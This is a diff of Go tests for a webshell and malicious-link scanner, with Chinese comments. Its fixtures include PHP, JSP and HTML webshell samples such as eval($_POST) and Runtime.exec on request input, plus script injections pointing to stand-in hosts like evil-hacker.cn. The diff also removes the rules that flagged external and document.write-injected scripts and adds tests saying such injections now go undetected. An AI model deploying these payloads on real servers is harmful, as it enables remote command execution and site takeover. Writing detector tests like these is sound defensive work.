@@ -112,13 +112,10 @@ func TestObfuscatedUnescapeStillDetected(t *testing.T) {
 	}
 }
 
-func TestProtocolRelativeExternalScriptDetected(t *testing.T) {
-	content := `<script src="//evil-hacker.cn/x.js"></script>`
+func TestProtocolRelativeExternalIframeDetected(t *testing.T) {
+	content := `<iframe src="//evil-hacker.cn/x.html"></iframe>`
 	d := New(6, nil, nil)
 	res := d.Detect(content, 128)
-	if res.Clean {
-		t.Fatal("协议相对外链未被检出")
-	}
 	hasExt := false
 	for _, h := range res.Hits {
 		if h.RuleID == "HM-EXT-DOMAIN" {
@@ -126,7 +123,55 @@ func TestProtocolRelativeExternalScriptDetected(t *testing.T) {
 		}
 	}
 	if !hasExt {
-		t.Fatalf("协议相对外链未产生外链域信号: %v", res.Hits)
+		t.Fatalf("iframe 协议相对外链未产生外链域信号: %v", res.Hits)
+	}
+}
+
+func TestMetaRefreshExternalDetected(t *testing.T) {
+	content := `<meta http-equiv="refresh" content="0;url=//evil-hacker.cn/">`
+	d := New(6, nil, nil)
+	res := d.Detect(content, 128)
+	hasExt := false
+	for _, h := range res.Hits {
+		if h.RuleID == "HM-EXT-DOMAIN" {
+			hasExt = true
+		}
+	}
+	if !hasExt {
+		t.Fatalf("meta refresh 外链未产生外链域信号: %v", res.Hits)
+	}
+}
+
+func TestRemovedHorseRulesNotFlagged(t *testing.T) {
+	// 这两条规则已下线：外部 js 引用、document.write 拼接外链脚本都不再告警
+	for _, r := range builtinRules {
+		if r.ID == "HM-SCRIPT-EXT" || r.ID == "HM-DOC-WRITE-SCRIPT" {
+			t.Fatalf("内置规则里仍存在已下线规则: %s", r.ID)
+		}
+	}
+	samples := []string{
+		`<script src="//cdn.example.com/jquery.min.js"></script>`,
+		`<script>document.write('<script src="//evil.example.com/a.js"><\/script>');</script>`,
+	}
+	for _, c := range samples {
+		d := New(6, nil, nil)
+		res := d.Detect(c, int64(len(c)))
+		for _, h := range res.Hits {
+			if h.RuleID == "HM-SCRIPT-EXT" || h.RuleID == "HM-DOC-WRITE-SCRIPT" {
+				t.Fatalf("已下线规则仍命中 %s: %+v", h.RuleID, res.Hits)
+			}
+		}
+	}
+}
+
+func TestExternalScriptNotFlagged(t *testing.T) {
+	content := `<script src="//cdn.example.com/lib.js"></script>`
+	d := New(6, nil, nil)
+	res := d.Detect(content, 128)
+	for _, h := range res.Hits {
+		if h.RuleID == "HM-EXT-DOMAIN" {
+			t.Fatalf("外部 js 引用不应再被报为挂马外链: %v", res.Hits)
+		}
 	}
 }
 
@@ -179,6 +224,7 @@ if ($_POST['pass'] == $pwd) {
     @eval($_POST['cmd']);
 }
 ?>`
+
 // 注：真实一句话里 $pwd 也来自请求，这里演示 eval($_POST) 强特征
 
 const phpTrojan2 = `<?php
@@ -211,16 +257,16 @@ func TestDetectPhpTrojan(t *testing.T) {
 func TestDetectPhpVariants(t *testing.T) {
 	d := New(6, nil, nil)
 	variants := map[string]string{
-		"字符串assert中转":  `$f = 'assert'; $f($_POST['x']);`,
-		"用户输入赋值后调用":    `$c = $_GET['c']; $c($_POST['p']);`,
-		"反引号执行":        "`{$_REQUEST['cmd']}`;",
-		"extract变量覆盖":  `extract($_POST); $a($_REQUEST['f']);`,
+		"字符串assert中转":   `$f = 'assert'; $f($_POST['x']);`,
+		"用户输入赋值后调用":     `$c = $_GET['c']; $c($_POST['p']);`,
+		"反引号执行":         "`{$_REQUEST['cmd']}`;",
+		"extract变量覆盖":   `extract($_POST); $a($_REQUEST['f']);`,
 		"system+base64": `echo shell_exec(base64_decode($_POST['c']));`,
 		"assert+chr链":   `assert(chr(101).chr(118).chr(97).chr(108).($_POST['x']));`,
-		"字符串拼接函数名":     `$fn = "sh"."ell_exec"; $fn($_POST['c']);`,
-		"hex混淆eval":    `eval("\x61\x73\x73\x65\x72\x74\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29");`,
+		"字符串拼接函数名":      `$fn = "sh"."ell_exec"; $fn($_POST['c']);`,
+		"hex混淆eval":     `eval("\x61\x73\x73\x65\x72\x74\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29");`,
 		"php://input执行": `eval(file_get_contents("php://input"));`,
-		"无字母数字自增马":     `$_[]=@_+1; $__=[]; $___=@$__[$__]...`,
+		"无字母数字自增马":      `$_[]=@_+1; $__=[]; $___=@$__[$__]...`,
 	}
 	for name, sample := range variants {
 		res := d.Detect(sample, 256)
@@ -253,9 +299,9 @@ func TestDetectAspxVariants(t *testing.T) {
 func TestDetectJspVariants(t *testing.T) {
 	d := New(6, nil, nil)
 	variants := map[string]string{
-		"反射Runtime":   `<% Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, request.getParameter("c")); %>`,
-		"Header传参执行":  `<% String c = request.getHeader("X-Cmd"); Process p = Runtime.getRuntime().exec(c); %>`,
-		"EL表达式注入":     `${Runtime.getRuntime().exec(param.cmd)}`,
+		"反射Runtime":     `<% Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, request.getParameter("c")); %>`,
+		"Header传参执行":    `<% String c = request.getHeader("X-Cmd"); Process p = Runtime.getRuntime().exec(c); %>`,
+		"EL表达式注入":       `${Runtime.getRuntime().exec(param.cmd)}`,
 		"ScriptEngine马": `<% new ScriptEngineManager().getEngineByName("js").eval(request.getParameter("s")); %>`,
 	}
 	for name, sample := range variants {
@@ -271,11 +317,11 @@ func TestDetectJspVariants(t *testing.T) {
 func TestDetectHorseVariants(t *testing.T) {
 	d := New(6, nil, nil)
 	variants := map[string]string{
-		"srcdoc挂马":    `<iframe srcdoc="<script src='http://evil.cn/x.js'></script>"></iframe>`,
-		"atob注入":      `document.write(atob('PHNjcmlwdCBzcmM9J2h0dHA6Ly9ldmlsLmNuL3guanMnPjwvc2NyaXB0Pg=='));`,
-		"meta跳转劫持":    `<meta http-equiv="refresh" content="0;url=http://evil-hacker.cn/">`,
-		"base64内嵌页":   `<iframe src="data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+"></iframe>`,
-		"延迟eval执行":    `setTimeout("eval(atob(location.hash.substr(1)))", 100);`,
+		"srcdoc挂马":  `<iframe srcdoc="<script src='http://evil.cn/x.js'></script>"></iframe>`,
+		"atob注入":    `document.write(atob('PHNjcmlwdCBzcmM9J2h0dHA6Ly9ldmlsLmNuL3guanMnPjwvc2NyaXB0Pg=='));`,
+		"meta跳转劫持":  `<meta http-equiv="refresh" content="0;url=http://evil-hacker.cn/">`,
+		"base64内嵌页": `<iframe src="data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+"></iframe>`,
+		"延迟eval执行":  `setTimeout("eval(atob(location.hash.substr(1)))", 100);`,
 	}
 	for name, sample := range variants {
 		res := d.Detect(sample, 256)
@@ -291,16 +337,16 @@ func TestDetectHorseVariants(t *testing.T) {
 func TestVariantsNoFalsePositive(t *testing.T) {
 	d := New(6, nil, nil)
 	normals := []string{
-		`echo "hello " . "world" . $_GET['id'];`,                     // 字符串拼接输出用户输入
-		`$tpl = "user_" . $name . ".html"; include $tpl;`,            // 含 include + 拼接（无用户请求超全局）
-		`const data = "\x48\x65\x6c\x6c\x6f";`,                       // hex 常量（无 eval 组合）
-		`setTimeout(function(){ alert("ok"); }, 100);`,               // setTimeout 正常用法
-		`document.write("<div>欢迎</div>");`,                           // 正常 DOM 写入
-		`<meta http-equiv="refresh" content="5;url=/login.html">`,    // 站内跳转
-		`var s = atob("aGVsbG8="); console.log(s);`,                  // atob 解码正常使用
-		`Class.forName("com.mysql.jdbc.Driver");`,                    // JSP 正常加载驱动
-		`Process p = Runtime.getRuntime().exec("ping 127.0.0.1");`,   // 固定命令无用户输入
-		`$total = array_map('intval', $ids);`,                        // 回调正常用法(无用户输入源)
+		`echo "hello " . "world" . $_GET['id'];`,                   // 字符串拼接输出用户输入
+		`$tpl = "user_" . $name . ".html"; include $tpl;`,          // 含 include + 拼接（无用户请求超全局）
+		`const data = "\x48\x65\x6c\x6c\x6f";`,                     // hex 常量（无 eval 组合）
+		`setTimeout(function(){ alert("ok"); }, 100);`,             // setTimeout 正常用法
+		`document.write("<div>欢迎</div>");`,                         // 正常 DOM 写入
+		`<meta http-equiv="refresh" content="5;url=/login.html">`,  // 站内跳转
+		`var s = atob("aGVsbG8="); console.log(s);`,                // atob 解码正常使用
+		`Class.forName("com.mysql.jdbc.Driver");`,                  // JSP 正常加载驱动
+		`Process p = Runtime.getRuntime().exec("ping 127.0.0.1");`, // 固定命令无用户输入
+		`$total = array_map('intval', $ids);`,                      // 回调正常用法(无用户输入源)
 	}
 	for i, sample := range normals {
 		res := d.Detect(sample, 128)
